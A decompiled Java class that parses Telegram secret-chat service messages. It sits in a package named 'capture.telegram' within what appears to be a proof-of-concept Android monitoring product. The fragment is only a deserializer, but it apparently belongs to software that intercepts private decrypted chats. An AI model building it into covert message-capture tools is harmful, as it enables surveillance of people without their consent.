package com.vvt.capture.telegram.internal;

public class TLRPC$TL_decryptedMessageService
  extends TLRPC.DecryptedMessage
{
  public static int constructor = 1930838368;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.random_id = l;
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    TLRPC.DecryptedMessageAction localDecryptedMessageAction = TLRPC.DecryptedMessageAction.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.action = localDecryptedMessageAction;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.random_id;
    paramAbstractSerializedData.writeInt64(l);
    this.action.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageService.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */